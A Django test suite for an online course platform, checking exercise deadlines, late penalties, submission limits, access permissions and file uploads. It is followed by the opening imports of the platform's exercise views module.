        self.broken_learning_object = LearningObject.objects.create(
            name=""test learning object"",
            course_module=self.course_module_with_late_submissions_allowed,
            category=self.learning_object_category,
            url=""l2"",
        )

        self.base_exercise = BaseExercise.objects.create(
            order=1,
            name=""test exercise"",
            course_module=self.course_module,
            category=self.learning_object_category,
            url=""b1"",
            max_submissions=1,
        )

        self.static_exercise = StaticExercise.objects.create(
            order=2,
            name=""test exercise 2"",
            course_module=self.course_module,
            category=self.learning_object_category,
            url=""s2"",
            max_points=50,
            points_to_pass=50,
            service_url=""/testServiceURL"",
            exercise_page_content=""test_page_content"",
            submission_page_content=""test_submission_content""
        )

        self.exercise_with_attachment = ExerciseWithAttachment.objects.create(
            order=3,
            name=""test exercise 3"",
            course_module=self.course_module,
            category=self.learning_object_category,
            url=""a1"",
            max_points=50,
            points_to_pass=50,
            max_submissions=0,
            files_to_submit=""test1.txt|test2.txt|img.png"",
            content=""test_instructions""
        )

        self.old_base_exercise = BaseExercise.objects.create(
            name=""test exercise"",
            course_module=self.old_course_module,
            category=self.learning_object_category,
            url=""b2"",
            max_submissions=1
        )

        self.base_exercise_with_late_submission_allowed = BaseExercise.objects.create(
            name=""test exercise with late submissions allowed"",
            course_module=self.course_module_with_late_submissions_allowed,
            category=self.learning_object_category,
            url=""b3"",
        )

        self.submission = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.grader.userprofile
        )
        self.submission.submitters.add(self.user.userprofile)

        self.submission_with_two_submitters = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.grader.userprofile
        )
        self.submission_with_two_submitters.submitters.add(self.user.userprofile)
        self.submission_with_two_submitters.submitters.add(self.user2.userprofile)

        self.late_submission = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.grader.userprofile
        )
        self.late_submission.submission_time = self.two_days_from_now
        self.late_submission.submitters.add(self.user.userprofile)

        self.submission_when_late_allowed = Submission.objects.create(
            exercise=self.base_exercise_with_late_submission_allowed,
            grader=self.grader.userprofile
        )
        self.submission_when_late_allowed.submitters.add(self.user.userprofile)

        self.late_submission_when_late_allowed = Submission.objects.create(
            exercise=self.base_exercise_with_late_submission_allowed,
            grader=self.grader.userprofile
        )
        self.late_submission_when_late_allowed.submission_time = self.two_days_from_now
        self.late_submission_when_late_allowed.submitters.add(self.user.userprofile)

        self.late_late_submission_when_late_allowed = Submission.objects.create(
            exercise=self.base_exercise_with_late_submission_allowed,
            grader=self.grader.userprofile
        )
        self.late_late_submission_when_late_allowed.submission_time = self.three_days_from_now
        self.late_late_submission_when_late_allowed.submitters.add(self.user.userprofile)

        self.course_hook = CourseHook.objects.create(
            hook_url=""http://localhost/test_hook_url"",
            course_instance=self.course_instance
        )

        self.deadline_rule_deviation = DeadlineRuleDeviation.objects.create(
            exercise=self.exercise_with_attachment,
            submitter=self.user.userprofile,
            extra_minutes=1440  # One day
        )

    def test_learning_object_category_unicode_string(self):
        self.assertEqual(""test category"", str(self.learning_object_category))
        self.assertEqual(""hidden category"", str(self.hidden_learning_object_category))

    #def test_learning_object_category_hiding(self):
    #    self.assertFalse(self.learning_object_category.is_hidden_to(self.user.userprofile))
    #    self.assertFalse(self.learning_object_category.is_hidden_to(self.grader.userprofile))
    #    self.assertTrue(self.hidden_learning_object_category.is_hidden_to(self.user.userprofile))
    #    self.assertFalse(self.hidden_learning_object_category.is_hidden_to(self.grader.userprofile))

    #    self.hidden_learning_object_category.set_hidden_to(self.user.userprofile, False)
    #    self.hidden_learning_object_category.set_hidden_to(self.grader.userprofile)

    #    self.assertFalse(self.hidden_learning_object_category.is_hidden_to(self.user.userprofile))
    #    self.assertTrue(self.hidden_learning_object_category.is_hidden_to(self.grader.userprofile))

    #    self.hidden_learning_object_category.set_hidden_to(self.user.userprofile, True)
    #    self.hidden_learning_object_category.set_hidden_to(self.grader.userprofile, False)

    #    self.assertTrue(self.hidden_learning_object_category.is_hidden_to(self.user.userprofile))
    #    self.assertFalse(self.hidden_learning_object_category.is_hidden_to(self.grader.userprofile))

    def test_learning_object_clean(self):
        try:
            self.learning_object.clean()
        except ValidationError:
            self.fail()
        self.assertRaises(ValidationError, self.broken_learning_object.clean())

    def test_learning_object_course_instance(self):
        self.assertEqual(self.course_instance, self.learning_object.course_instance)
        self.assertEqual(self.course_instance, self.broken_learning_object.course_instance)

    def test_base_exercise_one_has_submissions(self):
        self.assertFalse(self.base_exercise.one_has_submissions([self.user.userprofile])[0])
        self.assertTrue(self.static_exercise.one_has_submissions([self.user.userprofile])[0])
        self.assertTrue(self.exercise_with_attachment.one_has_submissions([self.user.userprofile])[0])
        self.submission.set_error()
        self.submission.save()
        self.submission_with_two_submitters.set_error()
        self.submission_with_two_submitters.save()
        self.late_submission.set_error()
        self.late_submission.save()
        self.assertTrue(self.base_exercise.one_has_submissions([self.user.userprofile])[0])

    def test_base_exercise_max_submissions(self):
        self.assertEqual(1, self.base_exercise.max_submissions_for_student(self.user.userprofile))
        self.assertEqual(10, self.static_exercise.max_submissions_for_student(self.user.userprofile))
        self.assertEqual(0, self.exercise_with_attachment.max_submissions_for_student(self.user.userprofile))

    def test_base_exercise_submissions_for_student(self):
        self.assertEqual(3, len(self.base_exercise.get_submissions_for_student(self.user.userprofile)))
        self.assertEqual(0, len(self.static_exercise.get_submissions_for_student(self.user.userprofile)))
        self.assertEqual(0, len(self.exercise_with_attachment.get_submissions_for_student(self.user.userprofile)))
        self.submission.set_error()
        self.submission.save()
        self.assertEqual(3, len(self.base_exercise.get_submissions_for_student(self.user.userprofile)))
        self.assertEqual(2, len(self.base_exercise.get_submissions_for_student(self.user.userprofile, True)))

    def test_base_exercise_is_open(self):
        self.assertTrue(self.base_exercise.is_open())
        self.assertTrue(self.static_exercise.is_open())
        self.assertTrue(self.exercise_with_attachment.is_open())
        self.assertFalse(self.old_base_exercise.is_open())
        self.assertFalse(self.base_exercise.is_open(self.yesterday))
        self.assertFalse(self.static_exercise.is_open(self.yesterday))
        self.assertFalse(self.exercise_with_attachment.is_open(self.yesterday))
        self.assertTrue(self.old_base_exercise.is_open(self.yesterday))
        self.assertTrue(self.base_exercise.is_open(self.tomorrow))
        self.assertTrue(self.static_exercise.is_open(self.tomorrow))
        self.assertTrue(self.exercise_with_attachment.is_open(self.tomorrow))
        self.assertFalse(self.old_base_exercise.is_open(self.tomorrow))

    def test_base_exercise_one_has_access(self):
        self.assertTrue(self.base_exercise.one_has_access([self.user.userprofile])[0])
        self.assertTrue(self.static_exercise.one_has_access([self.user.userprofile])[0])
        self.assertTrue(self.exercise_with_attachment.one_has_access([self.user.userprofile])[0])
        self.assertFalse(self.old_base_exercise.one_has_access([self.user.userprofile])[0])
        self.assertFalse(self.base_exercise.one_has_access([self.user.userprofile], self.yesterday)[0])
        self.assertFalse(self.static_exercise.one_has_access([self.user.userprofile], self.yesterday)[0])
        self.assertFalse(self.exercise_with_attachment.one_has_access([self.user.userprofile], self.yesterday)[0])
        self.assertTrue(self.old_base_exercise.one_has_access([self.user.userprofile], self.yesterday)[0])
        self.assertTrue(self.base_exercise.one_has_access([self.user.userprofile], self.tomorrow)[0])
        self.assertTrue(self.static_exercise.one_has_access([self.user.userprofile], self.tomorrow)[0])
        self.assertTrue(self.exercise_with_attachment.one_has_access([self.user.userprofile], self.tomorrow)[0])
        self.assertFalse(self.old_base_exercise.one_has_access([self.user.userprofile], self.tomorrow)[0])

    def test_base_exercise_submission_allowed(self):
        status, errors, students = (
            self.base_exercise.check_submission_allowed(self.user.userprofile))
        self.assertNotEqual(status, self.base_exercise.SUBMIT_STATUS.ALLOWED)
        self.assertEqual(len(errors), 1)
        json.dumps(errors)
        self.assertNotEqual(
            self.static_exercise.check_submission_allowed(self.user.userprofile)[0],
            self.static_exercise.SUBMIT_STATUS.ALLOWED)
        self.course_instance.enroll_student(self.user)
        self.assertEqual(
            self.static_exercise.check_submission_allowed(self.user.userprofile)[0],
            self.static_exercise.SUBMIT_STATUS.ALLOWED)
        self.assertEqual(
            self.exercise_with_attachment.check_submission_allowed(self.user.userprofile)[0],
            self.static_exercise.SUBMIT_STATUS.ALLOWED)
        self.assertNotEqual(
            self.old_base_exercise.check_submission_allowed(self.user.userprofile)[0],
            self.old_base_exercise.SUBMIT_STATUS.ALLOWED)

        self.assertEqual(
            self.base_exercise.check_submission_allowed(self.grader.userprofile)[0],
            self.base_exercise.SUBMIT_STATUS.ALLOWED)
        self.assertEqual(
            self.static_exercise.check_submission_allowed(self.grader.userprofile)[0],
            self.static_exercise.SUBMIT_STATUS.ALLOWED)
        self.assertEqual(
            self.exercise_with_attachment \
                .check_submission_allowed(self.grader.userprofile)[0],
            self.exercise_with_attachment.SUBMIT_STATUS.ALLOWED)
        self.assertEqual(
            self.old_base_exercise.check_submission_allowed(self.grader.userprofile)[0],
            self.old_base_exercise.SUBMIT_STATUS.ALLOWED)

    def test_base_exercise_submission_deviation(self):
        self.assertFalse(self.base_exercise.one_has_submissions([self.user.userprofile])[0])
        deviation = MaxSubmissionsRuleDeviation.objects.create(
            exercise=self.base_exercise,
            submitter=self.user.userprofile,
            extra_submissions=3
        )
        self.assertTrue(self.base_exercise.one_has_submissions([self.user.userprofile])[0])

    def test_base_exercise_deadline_deviation(self):
        self.assertFalse(self.old_base_exercise.one_has_access([self.user.userprofile])[0])
        deviation = DeadlineRuleDeviation.objects.create(
            exercise=self.old_base_exercise,
            submitter=self.user.userprofile,
            extra_minutes=10*24*60
        )
        self.assertTrue(self.old_base_exercise.one_has_access([self.user.userprofile])[0])

    def test_base_exercise_total_submission_count(self):
        self.assertEqual(self.base_exercise.get_total_submitter_count(), 2)
        self.assertEqual(self.static_exercise.get_total_submitter_count(), 0)
        self.assertEqual(self.exercise_with_attachment.get_total_submitter_count(), 0)

    def test_base_exercise_unicode_string(self):
        self.assertEqual(""1.1 test exercise"", str(self.base_exercise))
        self.assertEqual(""1.2 test exercise 2"", str(self.static_exercise))
        self.assertEqual(""1.3 test exercise 3"", str(self.exercise_with_attachment))

    def test_base_exercise_absolute_url(self):
        self.assertEqual(""/Course-Url/T-00.1000_d1/test-module/b1/"", self.base_exercise.get_absolute_url())
        self.assertEqual(""/Course-Url/T-00.1000_d1/test-module/s2/"", self.static_exercise.get_absolute_url())
        self.assertEqual(""/Course-Url/T-00.1000_d1/test-module/a1/"", self.exercise_with_attachment.get_absolute_url())

    def test_base_exercise_async_url(self):
        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')
        language = 'en'
        # the order of the parameters in the returned service url is non-deterministic, so we check the parameters separately
        split_base_exercise_service_url = self.base_exercise._build_service_url(language, request, [self.user.userprofile], 1, 'exercise', 'service').split(""?"")
        split_static_exercise_service_url = self.static_exercise._build_service_url(language, request, [self.user.userprofile], 1, 'exercise', 'service').split(""?"")
        self.assertEqual("""", split_base_exercise_service_url[0])
        self.assertEqual(""/testServiceURL"", split_static_exercise_service_url[0])
        # a quick hack to check whether the parameters are URL encoded
        self.assertFalse(""/"" in split_base_exercise_service_url[1] or "":"" in split_base_exercise_service_url[1])
        self.assertFalse(""/"" in split_static_exercise_service_url[1] or "":"" in split_static_exercise_service_url[1])
        # create dictionaries from the parameters and check each value. Note: parse_qs changes encoding back to regular utf-8
        base_exercise_url_params = urllib.parse.parse_qs(split_base_exercise_service_url[1])
        static_exercise_url_params = urllib.parse.parse_qs(split_static_exercise_service_url[1])
        self.assertEqual(['100'], base_exercise_url_params['max_points'])
        self.assertEqual('http://localhost:8001/service', base_exercise_url_params['submission_url'][0][:40])
        self.assertEqual(['50'], static_exercise_url_params['max_points'])
        self.assertEqual(['http://localhost:8001/service'], static_exercise_url_params['submission_url'])

    def test_static_exercise_load(self):
        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')
        static_exercise_page = self.static_exercise.load(request, [self.user.userprofile])
        self.assertIsInstance(static_exercise_page, ExercisePage)
        self.assertEqual(""test_page_content"", static_exercise_page.content)

    def test_static_exercise_grade(self):
        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')
        sub = Submission.objects.create_from_post(self.static_exercise, [self.user.userprofile], request)
        static_exercise_page = self.static_exercise.grade(request, sub)
        self.assertIsInstance(static_exercise_page, ExercisePage)
        self.assertTrue(static_exercise_page.is_accepted)
        self.assertEqual(""test_submission_content"", static_exercise_page.content)

    def test_exercise_upload_dir(self):
        from exercise.exercise_models import build_upload_dir
        self.assertEqual(""course_instance_1/exercise_attachment_5/test_file_name"",
                         build_upload_dir(self.exercise_with_attachment, ""test_file_name""))

    def test_exercise_with_attachment_files_to_submit(self):
        files = self.exercise_with_attachment.get_files_to_submit()
        self.assertEqual(3, len(files))
        self.assertEqual(""test1.txt"", files[0])
        self.assertEqual(""test2.txt"", files[1])
        self.assertEqual(""img.png"", files[2])

    def test_exercise_with_attachment_load(self):
        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')
        exercise_with_attachment_page = self.exercise_with_attachment.load(request, [self.user.userprofile])
        self.assertIsInstance(exercise_with_attachment_page, ExercisePage)
        c = exercise_with_attachment_page.content
        self.assertTrue('test_instructions' in c)
        self.assertTrue('test1.txt' in c and 'test2.txt' in c and ""img.png"" in c)

    def test_submission_files(self):
        self.assertEqual(0, len(self.submission.files.all()))
        self.submission.add_files(MultiValueDict({
            ""key1"": [""test_file1.txt"", ""test_file2.txt""],
            ""key2"": [""test_image.png"", ""test_audio.wav"", ""test_pdf.pdf""]
        }))
        self.assertEqual(5, len(self.submission.files.all()))

    def test_submission_points(self):
        try:
            self.submission.set_points(10, 5)
            self.fail(""Should not be able to set points higher than max points!"")
        except AssertionError:
            self.submission.set_points(5, 10)
            self.assertEqual(50, self.submission.grade)
            self.late_submission_when_late_allowed.set_points(10, 10)
            self.assertEqual(80, self.late_submission_when_late_allowed.grade)

    def test_submission_late_penalty_applied(self):
        self.submission.set_points(5, 10)
        self.late_submission.set_points(5, 10)
        self.submission_when_late_allowed.set_points(5, 10)
        self.late_submission_when_late_allowed.set_points(5, 10)
        self.late_late_submission_when_late_allowed.set_points(5, 10)
        self.assertFalse(self.submission.late_penalty_applied)
        self.assertTrue(self.late_submission.late_penalty_applied is not None)
        self.assertAlmostEqual(self.late_submission.late_penalty_applied, 0.0)
        self.assertEqual(self.late_submission.service_points, 5)
        self.assertEqual(self.late_submission.grade, 50)
        self.assertFalse(self.submission_when_late_allowed.late_penalty_applied)
        self.assertTrue(self.late_submission_when_late_allowed.late_penalty_applied)
        self.assertTrue(self.late_late_submission_when_late_allowed.late_penalty_applied)
        self.assertAlmostEqual(self.late_late_submission_when_late_allowed.late_penalty_applied, 0.2)
        self.assertEqual(self.late_late_submission_when_late_allowed.service_points, 5)
        self.assertEqual(self.late_late_submission_when_late_allowed.grade, 40)
        deviation = DeadlineRuleDeviation.objects.create(
            exercise=self.base_exercise_with_late_submission_allowed,
            submitter=self.user.userprofile,
            extra_minutes=10*24*60,
            without_late_penalty=True
        )
        self.late_late_submission_when_late_allowed.set_points(5, 10)
        self.assertFalse(self.late_late_submission_when_late_allowed.late_penalty_applied)
        deviation.without_late_penalty=False
        deviation.save()
        self.late_late_submission_when_late_allowed.set_points(5, 10)
        self.assertAlmostEqual(self.late_late_submission_when_late_allowed.late_penalty_applied, 0.2)

    def test_early_submission(self):
        self.course_module_with_late_submissions_allowed.opening_time = self.tomorrow
        submission = Submission.objects.create(
            exercise=self.base_exercise_with_late_submission_allowed,
            grader=self.grader.userprofile
        )
        submission.submitters.add(self.grader.userprofile)
        submission.set_points(10, 10)
        self.assertFalse(submission.late_penalty_applied)

    def test_unofficial_submission(self):
        self.course_module_with_late_submissions_allowed.late_submissions_allowed = False
        self.course_module_with_late_submissions_allowed.save()
        self.learning_object_category.accept_unofficial_submits = True
        self.learning_object_category.save()

        self.late_submission_when_late_allowed.set_points(10, 10)
        self.late_submission_when_late_allowed.set_ready()
        self.late_submission_when_late_allowed.save()
        self.assertEqual(self.late_submission_when_late_allowed.grade, 100)
        self.assertEqual(self.late_submission_when_late_allowed.status, Submission.STATUS.UNOFFICIAL)
        summary = UserExerciseSummary(self.base_exercise_with_late_submission_allowed, self.user)
        self.assertEqual(summary.get_submission_count(), 3)
        self.assertEqual(summary.get_points(), 0) # unofficial points are not shown here
        self.assertFalse(summary.is_graded())
        self.assertTrue(summary.is_unofficial())

        self.submission_when_late_allowed.set_points(5, 10)
        self.submission_when_late_allowed.set_ready()
        self.submission_when_late_allowed.save()
        self.assertEqual(self.submission_when_late_allowed.grade, 50)
        self.assertEqual(self.submission_when_late_allowed.status, Submission.STATUS.READY)
        summary = UserExerciseSummary(self.base_exercise_with_late_submission_allowed, self.user)
        self.assertEqual(summary.get_points(), 50)
        self.assertTrue(summary.is_graded())
        self.assertFalse(summary.is_unofficial())

        sub = Submission.objects.create(
            exercise=self.base_exercise_with_late_submission_allowed,
            grader=self.grader.userprofile
        )
        sub.submission_time = self.two_days_from_now + timedelta(days = 1)
        sub.save()
        sub.submitters.add(self.user.userprofile)
        sub.set_points(10, 10)
        sub.save()
        summary = UserExerciseSummary(self.base_exercise_with_late_submission_allowed, self.user)
        self.assertEqual(summary.get_points(), 50)
        self.assertTrue(summary.is_graded())
        self.assertFalse(summary.is_unofficial())

    def test_unofficial_max_submissions(self):
        self.learning_object_category.accept_unofficial_submits = True
        self.learning_object_category.save()
        res = self.base_exercise.one_has_submissions([self.user.userprofile])
        self.assertFalse(res[0] and len(res[1]) == 0)
        self.submission.set_points(1, 10)
        self.submission.set_ready()
        self.submission.save()
        self.assertEqual(self.submission.status, Submission.STATUS.UNOFFICIAL)

    def test_submission_unicode_string(self):
        self.assertEqual(""1"", str(self.submission))
        self.assertEqual(""2"", str(self.submission_with_two_submitters))
        self.assertEqual(""3"", str(self.late_submission))
        self.assertEqual(""4"", str(self.submission_when_late_allowed))
        self.assertEqual(""5"", str(self.late_submission_when_late_allowed))
        self.assertEqual(""6"", str(self.late_late_submission_when_late_allowed))

    def test_submission_status(self):
        self.assertEqual(""initialized"", self.submission.status)
        self.assertFalse(self.submission.is_graded)
        self.submission.set_error()
        self.assertEqual(""error"", self.submission.status)
        self.assertFalse(self.submission.is_graded)
        self.submission.set_waiting()
        self.assertEqual(""waiting"", self.submission.status)
        self.assertFalse(self.submission.is_graded)
        self.submission.set_error()
        self.assertEqual(""error"", self.submission.status)
        self.assertFalse(self.submission.is_graded)
        self.assertEqual(None, self.submission.grading_time)
        self.submission.set_ready()
        self.assertIsInstance(self.submission.grading_time, datetime)
        self.assertEqual(""ready"", self.submission.status)
        self.assertTrue(self.submission.is_graded)

    def test_submission_absolute_url(self):
        self.assertEqual(""/Course-Url/T-00.1000_d1/test-module/b1/submissions/1/"", self.submission.get_absolute_url())
        self.assertEqual(""/Course-Url/T-00.1000_d1/test-module/b1/submissions/3/"", self.late_submission.get_absolute_url())

    def test_submission_upload_dir(self):
        from exercise.submission_models import build_upload_dir
        submitted_file1 = SubmittedFile.objects.create(
            submission=self.submission,
            param_name=""testParam""
        )

        submitted_file2 = SubmittedFile.objects.create(
            submission=self.submission_with_two_submitters,
            param_name=""testParam2""
        )
        self.assertEqual(""course_instance_1/submissions/exercise_3/users_1/submission_1/test_file_name"", build_upload_dir(submitted_file1, ""test_file_name""))
        self.assertEqual(""course_instance_1/submissions/exercise_3/users_1-4/submission_2/test_file_name"", build_upload_dir(submitted_file2, ""test_file_name""))

    def test_exercise_views(self):
        upcoming_module = CourseModule.objects.create(
            name=""upcoming module"",
            url=""upcoming-module"",
            points_to_pass=15,
            course_instance=self.course_instance,
            opening_time=self.two_days_from_now,
            closing_time=self.three_days_from_now
        )
        upcoming_static_exercise = StaticExercise.objects.create(
            name=""upcoming exercise"",
            course_module=upcoming_module,
            category=self.learning_object_category,
            url=""sssss"",
            max_points=50,
            points_to_pass=50,
            service_url=""/testServiceURL"",
            exercise_page_content=""test_page_content"",
            submission_page_content=""test_submission_content""
        )
        self.submission_with_two_submitters.submitters.remove(self.user.userprofile)
        response = self.client.get(self.static_exercise.get_absolute_url())
        self.assertEqual(response.status_code, 302)

        self.client.login(username=""testUser"", password=""testPassword"")
        response = self.client.get(self.static_exercise.get_absolute_url())
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context[""exercise""], self.static_exercise)
        response = self.client.get(upcoming_static_exercise.get_absolute_url())
        self.assertEqual(response.status_code, 403)
        response = self.client.get(self.submission.get_absolute_url())
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context[""submission""], self.submission)
        response = self.client.get(self.submission_with_two_submitters.get_absolute_url())
        self.assertEqual(response.status_code, 403)

        self.client.login(username=""staff"", password=""staffPassword"")
        response = self.client.get(upcoming_static_exercise.get_absolute_url())
        self.assertEqual(response.status_code, 200)
        response = self.client.get(self.submission.get_absolute_url())
        self.assertEqual(response.status_code, 200)
        response = self.client.get(self.submission_with_two_submitters.get_absolute_url())
        self.assertEqual(response.status_code, 200)

        self.client.login(username=""grader"", password=""graderPassword"")
        response = self.client.get(upcoming_static_exercise.get_absolute_url())
        self.assertEqual(response.status_code, 200)
        response = self.client.get(self.submission.get_absolute_url())
        self.assertEqual(response.status_code, 200)
        response = self.client.get(self.submission_with_two_submitters.get_absolute_url())
        self.assertEqual(response.status_code, 200)

    def test_exercise_staff_views(self):
        self.other_instance = CourseInstance.objects.create(
            instance_name=""Another"",
            starting_time=self.today,
            ending_time=self.tomorrow,
            course=self.course,
            url=""another""
        )
        self.other_instance.assistants.add(self.grader.userprofile)
        list_submissions_url = self.base_exercise.get_submission_list_url()
        assess_submission_url = self.submission.get_url('submission-assess')
        response = self.client.get(list_submissions_url)
        self.assertEqual(response.status_code, 302)

        self.client.login(username=""testUser"", password=""testPassword"")
        response = self.client.get(list_submissions_url)
        self.assertEqual(response.status_code, 403)
        response = self.client.get(assess_submission_url)
        self.assertEqual(response.status_code, 403)

        self.client.login(username=""staff"", password=""staffPassword"")
        response = self.client.get(list_submissions_url)
        self.assertEqual(response.status_code, 200)
        response = self.client.get(assess_submission_url)
        self.assertEqual(response.status_code, 200)

        self.client.login(username=""grader"", password=""graderPassword"")
        response = self.client.get(list_submissions_url)
        self.assertEqual(response.status_code, 200)
        response = self.client.get(assess_submission_url)
        self.assertEqual(response.status_code, 403)

        self.base_exercise.allow_assistant_grading = True
        self.base_exercise.save()
        response = self.client.get(assess_submission_url)
        self.assertEqual(response.status_code, 200)

        self.course_instance.assistants.clear()
        response = self.client.get(list_submissions_url)
        self.assertEqual(response.status_code, 403)

    def test_uploading_and_viewing_file(self):
        exercise = BaseExercise.objects.create(
            order=4,
            name=""test exercise 4"",
            course_module=self.course_module,
            category=self.learning_object_category,
            url=""bbb"",
            max_points=50,
            points_to_pass=50,
            max_submissions=0,
            service_url=""http://nowhere.asdasfasf/testServiceURL"",
        )
        png = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x05\x00\x00\x00\x05\x08\x02\x00\x00\x00\x02\r\xb1\xb2\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x15IDAT\x08\xd7c`\xc0\n\xfe\xff\xff\x8f\xce\xc1""\x84\x05\x00\x00\xde\x7f\x0b\xf5<|+\x98\x00\x00\x00\x00IEND\xaeB`\x82'
        file_a = os.path.join(settings.MEDIA_ROOT, ""test.png"")
        file_b = os.path.join(settings.MEDIA_ROOT, ""test.py"")
        with open(file_a, ""wb"") as f:
            f.write(png)
        with open(file_b, ""wb"") as f:
            f.write(""Tekijät ja Hyyppö"".encode(""latin1""))

        self.course_instance.enroll_student(self.user)
        self.client.login(username=""testUser"", password=""testPassword"")

        with open(file_a, ""rb"") as fa:
            with open(file_b, ""rb"") as fb:
                response = self.client.post(exercise.get_absolute_url(), {
                    ""key"": ""value"",
                    ""file1"": fa,
                    ""file2"": fb,
                })
        self.assertEqual(response.status_code, 302)

        subs = self.user.userprofile.submissions.filter(exercise=exercise.id)
        self.assertEqual(subs.count(), 1)
        sub = subs.first()

        self.assertEqual(sub.submission_data[0], [""key"", ""value""])
        self.assertEqual(sub.files.count(), 2)
        files = sub.files.all().order_by(""param_name"")

        self.assertEqual(files[0].param_name, ""file1"")
        response = self.client.get(files[0].get_absolute_url())
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response[""Content-Type""], ""image/png"")

        self.assertEqual(files[1].param_name, ""file2"")
        response = self.client.get(files[1].get_absolute_url())
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response[""Content-Type""], 'text/plain; charset=""UTF-8""')

        response = self.client.get(files[1].get_absolute_url() + ""?download=1"")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response[""Content-Type""], ""application/octet-stream"")
        self.assertTrue(response[""Content-Disposition""].startswith(""attachment; filename=""))

        exercise.delete()

    def test_can_show_model_solutions(self):
        course_module_with_late_submissions_open = CourseModule.objects.create(
            name=""test module late open"",
            url=""test-module-late-open"",
            points_to_pass=50,
            course_instance=self.course_instance,
            opening_time=self.yesterday - timedelta(days=1),
            closing_time=self.yesterday,
            late_submissions_allowed=True,
            late_submission_deadline=self.tomorrow,
            late_submission_penalty=0.4,
        )
        course_module_with_late_submissions_closed = CourseModule.objects.create(
            name=""test module late closed"",
            url=""test-module-late-closed"",
            points_to_pass=50,
            course_instance=self.course_instance,
            opening_time=self.yesterday - timedelta(days=1),
            closing_time=self.yesterday,
            late_submissions_allowed=True,
            late_submission_deadline=self.today - timedelta(hours=1),
            late_submission_penalty=0.4,
        )
        base_exercise_with_late_open = BaseExercise.objects.create(
            name=""test exercise late open"",
            course_module=course_module_with_late_submissions_open,
            category=self.learning_object_category,
            url=""blateopen"",
            max_submissions=5,
        )
        base_exercise_with_late_closed = BaseExercise.objects.create(
            name=""test exercise late closed"",
            course_module=course_module_with_late_submissions_closed,
            category=self.learning_object_category,
            url=""blateclosed"",
            max_submissions=5,
        )

        self.assertFalse(self.base_exercise.can_show_model_solutions) # module is open
        self.assertFalse(self.base_exercise.can_show_model_solutions_to_student(self.user))
        self.assertTrue(self.old_base_exercise.can_show_model_solutions) # module is closed
        self.assertTrue(self.old_base_exercise.can_show_model_solutions_to_student(self.user))
        self.assertFalse(self.base_exercise_with_late_submission_allowed.can_show_model_solutions) # module is open
        self.assertFalse(self.base_exercise_with_late_submission_allowed.can_show_model_solutions_to_student(self.user))
        self.assertFalse(base_exercise_with_late_open.can_show_model_solutions)
        self.assertFalse(base_exercise_with_late_open.can_show_model_solutions_to_student(self.user))
        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)
        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))

        # The user has submitted alone and has no deadline extension.
        self.assertEqual(self.old_base_exercise.get_submissions_for_student(self.user.userprofile).count(), 0)
        submission1 = Submission.objects.create(
            exercise=self.old_base_exercise,
        )
        submission1.submitters.add(self.user.userprofile)
        self.assertTrue(self.old_base_exercise.can_show_model_solutions) # module is closed
        self.assertTrue(self.old_base_exercise.can_show_model_solutions_to_student(self.user))
        # Add a deadline extension that is still active.
        deadline_rule_deviation_old_base_exercise = DeadlineRuleDeviation.objects.create(
            exercise=self.old_base_exercise,
            submitter=self.user.userprofile,
            extra_minutes=1440, # One day
        )
        self.assertTrue(self.old_base_exercise.can_show_model_solutions)
        self.assertFalse(self.old_base_exercise.can_show_model_solutions_to_student(self.user))
        # Change the deadline extension so that it is not active anymore.
        self.old_course_module.closing_time = self.today - timedelta(hours=2)
        self.old_course_module.save()
        deadline_rule_deviation_old_base_exercise.delete()
        deadline_rule_deviation_old_base_exercise = DeadlineRuleDeviation.objects.create(
            exercise=self.old_base_exercise,
            submitter=self.user.userprofile,
            extra_minutes=10,
        )
        self.assertTrue(self.old_base_exercise.can_show_model_solutions)
        self.assertTrue(self.old_base_exercise.can_show_model_solutions_to_student(self.user))

        # Group submission
        submission2 = Submission.objects.create(
            exercise=base_exercise_with_late_closed,
        )
        submission2.submitters.add(self.user.userprofile, self.user2.userprofile)
        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)
        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))
        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user2))
        # Add a deadline extension to one group member. It affects all group members.
        # Note: deadline deviations are relative to the module closing time, not the late submission deadline.
        deadline_rule_deviation_ex_late_closed = DeadlineRuleDeviation.objects.create(
            exercise=base_exercise_with_late_closed,
            submitter=self.user.userprofile,
            extra_minutes=60*24*2,
        )
        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)
        self.assertFalse(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))
        self.assertFalse(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user2))
        # Change the deadline extension so that it is not active anymore.
        deadline_rule_deviation_ex_late_closed.delete()
        deadline_rule_deviation_ex_late_closed = DeadlineRuleDeviation.objects.create(
            exercise=base_exercise_with_late_closed,
            submitter=self.user.userprofile,
            extra_minutes=10,
        )
        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)
        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))
        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user2))

/n/n/nexercise/views.py/n/nfrom django.conf import settings
from django.contrib import messages
from django.core.exceptions import MultipleObjectsReturned, PermissionDenied
from django.http.response import Http404, HttpResponse
from django.shortcuts import get_object_or_404
from django.utils.decorators import method_decorator
from django.utils.translation import ugettext_lazy as _
from django.views.decorators.clickjacking import xframe_options_exempt
from django.views.decorators.csrf import csrf_exempt
from django.views.static import serve

from authorization.permissions import ACCESS
from course.models import CourseModule
from course.viewbase import CourseInstanceBaseView, EnrollableViewMixin
from lib.remote_page import RemotePageNotFound, request_for_response
